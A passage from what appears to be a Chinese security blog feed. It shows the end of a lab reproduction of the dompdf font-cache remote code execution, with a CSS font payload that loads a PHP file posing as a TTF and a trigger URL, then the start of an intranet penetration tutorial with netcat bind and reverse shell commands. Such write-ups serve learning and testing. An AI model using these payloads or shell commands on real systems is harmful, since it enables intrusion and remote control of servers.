class="comment">* Enabling this for documents you do not trust (e.g. arbitrary remote html</span></span><br><span class="line"><span class="comment">* pages) is a security risk. Embedded scripts are run with the same level of</span></span><br><span class="line"><span class="comment">* system access available to dompdf. Set this option to false (recommended)</span></span><br><span class="line"><span class="comment">* if you wish to process untrusted documents.</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* This setting may increase the risk of system exploit. Do not change</span></span><br><span class="line"><span class="comment">* this settings without understanding the consequences. Additional</span></span><br><span class="line"><span class="comment">* documentation is available on the dompdf wiki at:</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* <span class="doctag">@var</span> bool</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">private</span> <span class="variable">$isPhpEnabled</span> = <span class="literal">false</span>;</span><br></pre></td></tr></table></figure><p>远程资源加载：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Enable remote file access</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* If this setting is set to true, DOMPDF will access remote sites for</span></span><br><span class="line"><span class="comment">* images and CSS files as required.</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* ==== IMPORTANT ====</span></span><br><span class="line"><span class="comment">* This can be a security risk, in particular in combination with isPhpEnabled and</span></span><br><span class="line"><span class="comment">* allowing remote html code to be passed to $dompdf = new DOMPDF(); $dompdf-&gt;load_html(...);</span></span><br><span class="line"><span class="comment">* This allows anonymous users to download legally doubtful internet content which on</span></span><br><span class="line"><span class="comment">* tracing back appears to being downloaded by your server, or allows malicious php code</span></span><br><span class="line"><span class="comment">* in remote html pages to be executed by your server with your account privileges.</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* This setting may increase the risk of system exploit. Do not change</span></span><br><span class="line"><span class="comment">* this settings without understanding the consequences. Additional</span></span><br><span class="line"><span class="comment">* documentation is available on the dompdf wiki at:</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* <span class="doctag">@var</span> bool</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">private</span> <span class="variable">$isRemoteEnabled</span> = <span class="literal">false</span>;</span><br></pre></td></tr></table></figure><p>查看这个是否开启可以xss构造：<code>?t=aa&lt;link rel=stylesheet href=&quot;xxxxxxx/test.css&quot;&gt;&amp;pdf</code>，来包含一个外部css，判断这个选项是否开启。</p><p>若开启，dompdf即允许通过font-face 的css来加载自定义的字体。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">@font-face</span> &#123;</span><br><span class="line">    <span class="attribute">font-family</span>:<span class="string">&#x27;exploitfont&#x27;</span>;</span><br><span class="line">    <span class="attribute">src</span>:<span class="built_in">url</span>(<span class="string">&#x27;http://localhost:9001/xxxx.ttf&#x27;</span>);</span><br><span class="line">    <span class="attribute">font-weight</span>:<span class="string">&#x27;normal&#x27;</span>;</span><br><span class="line">    <span class="attribute">font-style</span>:<span class="string">&#x27;normal&#x27;</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>使用外部字体的时候，dompdf将其存在<code>/lib/fonts</code>的目录中，并在<code>dompdf_font_family_cache.php</code>using中添加相应的条目<code>saveFontFamilies()</code>，这个函数将 dompdf 已知的字体编码为 PHP 数组，以及稍后查找它们所需的信息。：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Saves the stored font family cache</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The name and location of the cache file are determined by &#123;<span class="doctag">@link</span></span></span><br><span class="line"><span class="comment"> * FontMetrics::CACHE_FILE&#125;. This file should be writable by the</span></span><br><span class="line"><span class="comment"> * webserver process.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> FontMetrics::loadFontFamilies()</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">saveFontFamilies</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// replace the path to the DOMPDF font directories with the corresponding constants (allows for more portability)</span></span><br><span class="line">    <span class="variable">$cacheData</span> = sprintf(<span class="string">&quot;&lt;?php return function (%s, %s) &#123;%s&quot;</span>, <span class="string">&#x27;$fontDir&#x27;</span>, <span class="string">&#x27;$rootDir&#x27;</span>, PHP_EOL);</span><br><span class="line">    <span class="variable">$cacheData</span> .= sprintf(<span class="string">&quot;return array (%s&quot;</span>, PHP_EOL);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;fontLookup <span class="keyword">as</span> <span class="variable">$family</span> =&gt; <span class="variable">$variants</span>) &#123;</span><br><span class="line">        <span class="variable">$cacheData</span> .= sprintf(<span class="string">&quot;  &#x27;%s&#x27; =&gt; array(%s&quot;</span>, addslashes(<span class="variable">$family</span>), PHP_EOL);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$variants</span> <span class="keyword">as</span> <span class="variable">$variant</span> =&gt; <span class="variable">$path</span>) &#123;</span><br><span class="line">            <span class="variable">$path</span> = sprintf(<span class="string">&quot;&#x27;%s&#x27;&quot;</span>, <span class="variable">$path</span>);</span><br><span class="line">            <span class="variable">$path</span> = str_replace(<span class="string">&#x27;\&#x27;&#x27;</span> . <span class="keyword">$this</span>-&gt;options-&gt;getFontDir(), <span class="string">&#x27;$fontDir . \&#x27;&#x27;</span>, <span class="variable">$path</span>);</span><br><span class="line">            <span class="variable">$path</span> = str_replace(<span class="string">&#x27;\&#x27;&#x27;</span> . <span class="keyword">$this</span>-&gt;options-&gt;getRootDir(), <span class="string">&#x27;$rootDir . \&#x27;&#x27;</span>, <span class="variable">$path</span>);</span><br><span class="line">            <span class="variable">$cacheData</span> .= sprintf(<span class="string">&quot;    &#x27;%s&#x27; =&gt; %s,%s&quot;</span>, <span class="variable">$variant</span>, <span class="variable">$path</span>, PHP_EOL);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$cacheData</span> .= sprintf(<span class="string">&quot;  ),%s&quot;</span>, PHP_EOL);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$cacheData</span> .= <span class="string">&quot;);&quot;</span> . PHP_EOL;</span><br><span class="line">    <span class="variable">$cacheData</span> .= <span class="string">&quot;&#125;; ?&gt;&quot;</span>;</span><br><span class="line">    file_put_contents(<span class="keyword">$this</span>-&gt;getCacheFile(), <span class="variable">$cacheData</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果不能使用字体缓存索引，直接使用字体缓存是否可行？看下dompdf如何如何注册新字体(部分，具体在<a href="https://github.com/dompdf/dompdf/blob/v1.2.0/src/FontMetrics.php#L174">这里</a>)：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> array $style</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> string $remoteFile</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> resource $context</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span> bool</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">registerFont</span>(<span class="params"><span class="variable">$style</span>, <span class="variable">$remoteFile</span>, <span class="variable">$context</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="variable">$fontname</span> = mb_strtolower(<span class="variable">$style</span>[<span class="string">&quot;family&quot;</span>]);</span><br><span class="line">   <span class="variable">$styleString</span> = <span class="keyword">$this</span>-&gt;getType(<span class="string">&quot;<span class="subst">&#123;$style[&#x27;weight&#x27;]&#125;</span> <span class="subst">&#123;$style[&#x27;style&#x27;]&#125;</span>&quot;</span>);</span><br><span class="line"></span><br><span class="line">   <span class="variable">$fontDir</span> = <span class="keyword">$this</span>-&gt;options-&gt;getFontDir();</span><br><span class="line">   <span class="variable">$remoteHash</span> = md5(<span class="variable">$remoteFile</span>);</span><br><span class="line"></span><br><span class="line">   <span class="variable">$prefix</span> = <span class="variable">$fontname</span> . <span class="string">&quot;_&quot;</span> . <span class="variable">$styleString</span>;</span><br><span class="line">   <span class="variable">$prefix</span> = preg_replace(<span class="string">&quot;[\\W]&quot;</span>, <span class="string">&quot;_&quot;</span>, <span class="variable">$prefix</span>);</span><br><span class="line">   <span class="variable">$prefix</span> = preg_replace(<span class="string">&quot;/[^-_\\w]+/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$prefix</span>);</span><br><span class="line"></span><br><span class="line">   <span class="variable">$localFile</span> = <span class="variable">$fontDir</span> . <span class="string">&quot;/&quot;</span> . <span class="variable">$prefix</span> . <span class="string">&quot;_&quot;</span> . <span class="variable">$remoteHash</span>;</span><br><span class="line">   <span class="variable">$localFile</span> .= <span class="string">&quot;.&quot;</span>.strtolower(pathinfo(parse_url(<span class="variable">$remoteFile</span>, PHP_URL_PATH), PATHINFO_EXTENSION));</span><br><span class="line"></span><br><span class="line">   <span class="comment">// Download the remote file</span></span><br><span class="line">   <span class="keyword">list</span>(<span class="variable">$remoteFileContent</span>, <span class="variable">$http_response_header</span>) = @Helpers::getFileContent(<span class="variable">$remoteFile</span>, <span class="variable">$context</span>);</span><br><span class="line"></span><br><span class="line">   <span class="variable">$localTempFile</span> = @tempnam(<span class="keyword">$this</span>-&gt;options-&gt;get(<span class="string">&quot;tempDir&quot;</span>), <span class="string">&quot;dompdf-font-&quot;</span>);</span><br><span class="line">   file_put_contents(<span class="variable">$localTempFile</span>, <span class="variable">$remoteFileContent</span>);</span><br><span class="line"></span><br><span class="line">   <span class="variable">$font</span> = Font::load(<span class="variable">$localTempFile</span>);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (!<span class="variable">$font</span>) &#123;</span><br><span class="line">       unlink(<span class="variable">$localTempFile</span>);</span><br><span class="line">       <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="variable">$font</span>-&gt;parse();</span><br><span class="line">   <span class="variable">$font</span>-&gt;close();</span><br><span class="line"></span><br><span class="line">   unlink(<span class="variable">$localTempFile</span>);</span><br><span class="line"></span><br><span class="line">   <span class="comment">// Save the changes</span></span><br><span class="line">   file_put_contents(<span class="variable">$localFile</span>, <span class="variable">$remoteFileContent</span>);</span><br><span class="line">   <span class="keyword">$this</span>-&gt;saveFontFamilies();</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，新缓存字体的名字是确定了的，<code>字体名称</code>，<code>样式</code>，<code>MD5(RemoteURL)</code>这三个组成，比如，url是这样:<code>http://attacker.local/test_font.ttf</code>，样式为normal，那么将被存为：<code>testfont_normal_d249c21fbbb1302ab53282354d462d9e.ttf</code></p><p>![image-20220319110855454](dompdf 0day(RCE)复现/image-20220319110855454.png)</p><p>那么这样的话，即使没有目录遍历的洞，也可以不用爆破直接知道文件名。</p><p>当然，上传的字体必须有效，必须能被加载和解析。</p><p>但是源码有个问题，他判断字体文件是否正常，是基于上传文件的文件头，类似Linux的判断方式，而不管文件后缀，那么即使使用其他后缀，只要符合<code>ttf</code>的文件头标准，仍可被解析。</p><p>下面是构造的<code>css</code>以及<code>ttf(php)</code>：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">@font-face</span> &#123;</span><br><span class="line">    <span class="attribute">font-family</span>:<span class="string">&#x27;exploitfont&#x27;</span>;</span><br><span class="line">    <span class="attribute">src</span>:<span class="built_in">url</span>(<span class="string">&#x27;http://localhost:9001/exploit_font.php&#x27;</span>);</span><br><span class="line">    <span class="attribute">font-weight</span>:<span class="string">&#x27;normal&#x27;</span>;</span><br><span class="line">    <span class="attribute">font-style</span>:<span class="string">&#x27;normal&#x27;</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p><img src="/2022/03/19/dompdf%200day(RCE)%E5%A4%8D%E7%8E%B0/image-20220319111650926.png" alt="image-20220319111650926"></p><p>至于ttf文件结构？网上一堆。。。</p><p>下面直接使用<a href="https://github.com/positive-security/dompdf-rce">github</a>的来复现：</p><p>开启应用和exp：</p><p><img src="/2022/03/19/dompdf%200day(RCE)%E5%A4%8D%E7%8E%B0/image-20220319111921628.png" alt="image-20220319111921628"></p><p>使用exploit_font.php触发：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:9000/index.php?pdf&amp;title=&lt;link rel=stylesheet href=&#x27;http://localhost:9001/exploit.css&#x27;&gt;</span><br></pre></td></tr></table></figure><p>之后访问：<code>http://localhost:9000/dompdf/lib/fonts/exploitfont_normal_3f83639933428d70e74a061f39009622.php</code></p><p><img src="/2022/03/19/dompdf%200day(RCE)%E5%A4%8D%E7%8E%B0/image-20220319112233859.png" alt="image-20220319112233859"></p><p>成功触发。</p><p>u1s1这个洞完全可以出个CTF题，，</p><p>参考链接：</p><blockquote><p>  <a href="https://positive.security/blog/dompdf-rce">https://positive.security/blog/dompdf-rce</a></p><p>  <a href="https://github.com/positive-security/dompdf-rce">https://github.com/positive-security/dompdf-rce</a></p><p>  <a href="https://juejin.cn/post/7010064099027451912">ttf文件格式</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这次的漏洞是&lt;code&gt;dompdf&lt;/code&gt;这样一个php的库，dompdf库用于将html呈现为pdf，还是比较新的。&lt;/p&gt;
&lt;p&gt;最开始这个漏洞并不是rce，而是xss。&lt;/p&gt;
&lt;p&gt;首先是两个配置：&lt;/p&gt;
&lt;p&gt;在 PDF 渲染期间执行嵌入式 PHP，之后</summary>
      
    
    
    
    
    <category term="漏洞复现" scheme="http://example.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透&amp;横向移动&amp;····</title>
    <link href="http://example.com/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&amp;%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"/>
    <id>http://example.com/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&amp;%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/</id>
    <published>2022-03-18T16:00:00.000Z</published>
    <updated>2022-03-19T09:37:16.437Z</updated>
    
    <content type="html"><![CDATA[<p>GitHub：<a href="https://github.com/Ghostasky/IntranetPenetrationLearn">https://github.com/Ghostasky/IntranetPenetrationLearn</a></p><p>给个star吧QAQ</p><p>[toc]</p><h1 id="1-名词解释"><a href="#1-名词解释" class="headerlink" title="1.名词解释"></a>1.名词解释</h1><p>工作组、域、域控制器（DC）、父域、子域、域树、域森林、活动目录（AD）、DMZ、域内权限等</p><h2 id="工作组"><a href="#工作组" class="headerlink" title="工作组"></a>工作组</h2><p>将不同的计算机按功能列入到不同的工作组中。工作组没有集中管理的作用，工作组中所有的计算机都是对等的。工作组不受密码保护。一个账户只能登陆到一台计算机。每一台计算机都在本地存储用户的帐户。</p><p>工作组的正规解释：在一个大的单位内，可能有成百上千台电脑互连组成局域网，如果这些电脑不分组，可想而知有多么混乱，要找一台电脑很困难。为了解决这一问题，就有了“工作组”这个概念，将不同的电脑一般按功能（或部门）分别列入不同的工作组中。</p><p>每台计算机都是对等的，<code>a</code>机器不能登录<code>b</code>机器。</p><h2 id="域"><a href="#域" class="headerlink" title="域"></a>域</h2><p><a href="https://blog.51cto.com/angerfire/144123">域，域树，域林，根域</a></p><p><a href="https://www.cnblogs.com/-mo-/p/11906772.html">内网基础知识</a></p><p>域(Domain)是一个有安全边界的计算机集合（安全边界意思是在两个域中，一个域中的用户无法访问另一个域中的资源），可以简单的把域理解成升级版的“工作组”，相比工作组而言,它有一个更加严格的安全管理控制机制,如果你想访问域内的资源,必须拥有一个合法的身份登陆到该域中,而你对该域内的资源拥有什么样的权限,还需要取决于你在该域中的用户身份。</p><p>域控制器（Domain Controller，简写为DC）是一个域中的一台类似管理服务器的计算机，相当于一个单位的门卫一样，它负责每一台联入的电脑和用户的验证工作，域内电脑如果想互相访问首先都是经过它的审核。</p><h3 id="单域"><a href="#单域" class="headerlink" title="单域"></a>单域</h3><p>在一般的具有固定地理位置的小公司里，建立一个域就可以满足所需。<br>一般在一个域内要建立至少两个域服务器，一个作为DC，一个是备份DC。如果没有第二个备份DC，那么一旦DC瘫痪了，则域内的其他用户就不能登陆该域了，因为活动目录的数据库（包括用户的帐号信息）是存储在DC中的。而有一台备份域控制器（BDC），则至少该域还能正常使用，期间把瘫痪的DC恢复了就行了。</p><h3 id="父域和子域"><a href="#父域和子域" class="headerlink" title="父域和子域"></a>父域和子域</h3><p>出于管理及其他一些需求，需要在网络中划分多个域，第一个域称为父域，各分部的域称为该域的子域。</p><p>比如一个大公司，它的不同分公司在不同的地理位置，则需父域及子域这样的结构。如果把不同地理位置的分公司放在同一个域内，那么他们之间信息交互（包括同步，复制等）所花费的时间会比较长，而且占用的带宽也比较大。（因为在同一个域内，信息交互的条目是很多的，而且不压缩；而在域和域之间，信息交互的条目相对较少，而且压缩。）</p><p>还有一个好处，就是子公司可以通过自己的域来管理自己的资源。</p><p>还有一种情况，就是出于安全策略的考虑，因为每个域都有自己独有的安全策略。比如一个公司的财务部门希望能使用特定的安全策略（包括帐号密码策略等），那么可以将财务部门做成一个子域来单独管理。</p><h3 id="域树"><a href="#域树" class="headerlink" title="域树"></a>域树</h3><p>在一个域树中，父域可以包含很多子域，子域是相对父域来说的，指域名中的每一个段。子域只能使用父域作为域名的后缀，也就是说在一个域树中，域的名字是连续的。</p><p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/1561366-20191121161917242-744398688.png" alt="img"></p><h3 id="域森林"><a href="#域森林" class="headerlink" title="域森林"></a>域森林</h3><p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/1561366-20191121161939610-1988580593.png" alt="img"></p><h3 id="DNS域名服务器"><a href="#DNS域名服务器" class="headerlink" title="DNS域名服务器"></a>DNS域名服务器</h3><p>DNS域名服务器（Domain Name Server）是进行域名(domain name)和与之相对应的IP地址 (IP address)转换的服务器。</p><p>在域树的介绍中，可以看到域树中的域的名字和DNS域的名字非常相似，实际上域的名字就是DNS域的名字，因为域中的计算机使用DNS来定位域控制器和服务器以及其他计算机、网络服务等。</p><p>一般情况下,我们在内网渗透时就通过寻找DNS服务器来定位域控制器，因为通常DNS服务器和域控制器会处在同一台机器上。</p><h3 id="活动目录（AD）"><a href="#活动目录（AD）" class="headerlink" title="活动目录（AD）"></a>活动目录（AD）</h3><p>域环境中提供目录服务的组件。</p><p>就是存储有关网络对象（如用户、组、计算机、共享资源、打印机和联系人等）的信息。目录服务是帮助用户快速准确的从目录中查找到他所需要的信息的服务。</p><h3 id="AD与DC的区别"><a href="#AD与DC的区别" class="headerlink" title="AD与DC的区别"></a>AD与DC的区别</h3><p>把存放有活动目录数据库的计算机就称为DC。所以说我们要实现域环境，其实就是要安装AD，当内网中的一台计算机安装了AD后，它就变成了DC。</p><h3 id="安全域划分"><a href="#安全域划分" class="headerlink" title="安全域划分"></a>安全域划分</h3><p>安全域划分的目的是将一组安全等级相同的计算机划入同一个网段内，这一网段内的计算机拥有相同的网络边界，在网络边界上采用防火墙部署来实现对其他安全域的NACL（网络访问控制策略），允许哪些IP访问此域、不允许哪些访问此域；允许此域访问哪些IP/网段、不允许访问哪些IP/网段。使得其风险最小化，当发生攻击时可以将威胁最大化的隔离，减少对域内计算机的影响。</p><p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/1561366-20191121163434689-855209408.png" alt="img"></p><p>1.内网（安全级别最高）：分为核心区（存储企业最重要的数据，只有很少的主机能够访问）和办公区（员工日常工作区，一般能够访问DMZ，部分主机可以访问核心区）</p><p>2.DMZ（Demilitarized Zone，边界网络，隔离区，安全级别中等）：作为内网中安全系统和非安全系统之间的缓冲区，用于对外提供服务，一般可以放置一些必须公开的服务器设施</p><p>3.外网（Internet，安全级别最低）</p><h2 id="DMZ区域"><a href="#DMZ区域" class="headerlink" title="DMZ区域"></a>DMZ区域</h2><p>DMZ称为“隔离区”，也称“非军事化区”。是为了解决安装防火墙后外部网络不能访问内部网络服务器的问题，而设立的一个非安全系统与安全系统之间的缓冲区。<br>这个缓冲区位于企业内部网络和外部网络之间的小网络区域内，在这个小网络区域内可以放置一些必须公开的服务器设施，如企业Web服务器、FTP服务器和论坛等。<br>另一方面，通过这样一个DMZ区域，更加有效地保护了内部网络，因为这种网络部署，比起一般的防火墙方案，对攻击者来说又多了一道关卡。</p><ul><li>  内网可以访问外网：内网的用户需要自由地访问外网。在这一策略中，防火墙需要执行NAT。</li><li>  内网可以访问DMZ：此策略使内网用户可以使用或者管理DMZ中的服务器。</li><li>  外网不能访问内网：这是防火墙的基本策略了，内网中存放的是公司内部数据，显然这些数据是不允许外网的用户进行访问的。如果要访问，就要通过VPN方式来进行。</li><li>  外网可以访问DMZ：DMZ中的服务器需要为外界提供服务，所以外网必须可以访问DMZ。同时，外网访问DMZ需要由防火墙完成对外地址到服务器实际地址的转换。</li><li>  DMZ不能访问内网：如不执行此策略，则当入侵者攻陷DMZ时，内部网络将不会受保护。　</li><li>  DMZ不能访问外网：此条策略也有例外，比如我们的例子中，在DMZ中放置邮件服务器时，就需要访问外网，否则将不能正常工作。</li></ul><h2 id="域内权限"><a href="#域内权限" class="headerlink" title="域内权限"></a>域内权限</h2><p>组（Group）是用户帐号的集合。通过向一组用户分配权限从而不必向每个用户分配权限，管理员在日常工作中不必要去为单个用户帐号设置自己独特的访问权限，而是将用户帐号加入到相对应的安全组中。</p><h3 id="1-域本地组"><a href="#1-域本地组" class="headerlink" title="1.域本地组"></a>1.域本地组</h3><p>可以从域林中添加用户账号，权限只限于本域资源的访问。</p><h3 id="2-全局组"><a href="#2-全局组" class="headerlink" title="2.全局组"></a>2.全局组</h3><p>可以从本域中添加用户账号，权限可以访问整个域林的资源。</p><h3 id="3-通用组"><a href="#3-通用组" class="headerlink" title="3.通用组"></a>3.通用组</h3><p>可从整个域林添加成员，权限可访问整个域林的资源。</p><h3 id="4-A-G-DL-P策略"><a href="#4-A-G-DL-P策略" class="headerlink" title="4.A-G-DL-P策略"></a>4.A-G-DL-P策略</h3><p>A-G-DL-P策略 （A:表示用户账户、G:表示全局组、U:表示通用组、DL:表示域本地组、P:表示资源权限）</p><h1 id="2-域搭建"><a href="#2-域搭建" class="headerlink" title="2.域搭建"></a>2.域搭建</h1><blockquote><p>  DC: win2008 ，密码Admin123<br>  DM: win2003<br>  DM: winxp</p></blockquote><p>DC2008：</p><p>网络配置</p><p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220316174256681.png" alt="image-20220316174256681"></p><p>添加服务器角色：</p><p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220316174530574.png" alt="image-20220316174530574"></p><p>配置域服务(在administrator用户下。。)：</p><p>dos下：<code>dcpromo</code></p><p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220316174748182.png" alt="image-20220316174748182"></p><p>提示错误的话，管理员cmd<code>net user administrator /passwordreq:yes</code></p><p>设置林根域：</p><p>林就是在多域情况下形成的森林,根表示基础,其他在此根部衍生</p><p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220316182106728.png" alt="image-20220316182106728"></p><p>域数据存放的地址：</p><p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220316182303660.png" alt="image-20220316182303660"></p><p>密码还是设置为Admin123!</p><p>接下来就是配置win2003和xp，都和08差不多</p><p>配置的dns要设置为主域控的ip：192.168.188.100</p><p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220316183849046.png" alt="image-20220316183849046"></p><p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220316184043460.png" alt="image-20220316184043460"></p><h1 id="3-端口转发-amp-边界代理"><a href="#3-端口转发-amp-边界代理" class="headerlink" title="3.端口转发&amp;边界代理"></a>3.端口转发&amp;边界代理</h1><p>先说下正向代理和反向代理：<img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/1606872766_5fc6eebe0e0d42db8c48c.png!small" alt="img"></p><p>正向代理：<code>Lhost--&gt;proxy--&gt;Rhost</code></p><p>反向代理：<code>Lhost&lt;---&gt;proxy&lt;---&gt;firewall&lt;---&gt;Rhost</code>，一般情况下，防火墙肯定不能让外网机器随便访问地访问内网机器，所以就提出反向代理。</p><p>Lhost只向proxy发送普通的请求，具体让他转到哪里，proxy自己判断，然后将返回的数据递交回来，这样的好处就是在某些防火墙只允许proxy数据进出的时候可以有效的进行穿透。</p><p>代理的本质：socks协议，位于会话层（应用层）</p><p>Socks介于传输层与表示层之间，使用TCP协议传输数据，因而不提供如传递ICMP信息之类的网络层相关服务。</p><p>目前有两个版本：SOCKS4和SOCKS5</p><p>SOCKS4支持TELNET、FTPHTTP等TCP协议；</p><p>SOCKS5支持TCP与UDP，并支持安全认证方案。</p><p>Ps: Socks不支持ICMP，不能使用ping命令</p><p>使用nc演示</p><blockquote><p>  主机A：192.168.153.138</p><p>  主机B：192.168.153.140</p></blockquote><p>正向：</p><p>A机：<code>nc -l -p 5555 -t -e cmd.exe</code>，-t是通过telnet模式执行 cmd.exe 程序，可以省略</p><p>B机：<code>nc -nvv 192.168.153.138 5555</code>，</p><p>反向：</p><p>B机：监听 <code>nc-lp 5555</code></p><p>在A机反弹：<code>nc -t -e cmd 192.168.153.140 5555</code></p><h2 id="reGeorg-Proxychains"><a href="#reGeorg-Proxychains" class="headerlink" 